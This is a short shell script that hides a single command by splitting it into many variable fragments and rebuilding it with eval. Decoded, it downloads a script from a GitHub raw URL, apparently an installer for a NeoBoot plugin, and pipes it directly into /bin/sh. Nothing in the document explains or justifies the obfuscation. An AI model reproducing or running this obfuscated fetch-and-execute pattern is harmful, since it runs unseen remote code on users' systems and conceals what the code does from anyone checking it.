z="
";Gz='serc';Kz='miln';Qz='ain/';Oz='_v9.';Bz=' htt';Cz='ps:/';Lz='abil';Tz='O - ';Nz='boot';Fz='hubu';Dz='/raw';Sz='sh -';Rz='iNB.';Jz='om/e';Ez='.git';Pz='58/m';Wz='h';Vz='in/s';Hz='onte';Iz='nt.c';Az='wget';Mz='/neo';Uz='| /b';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz"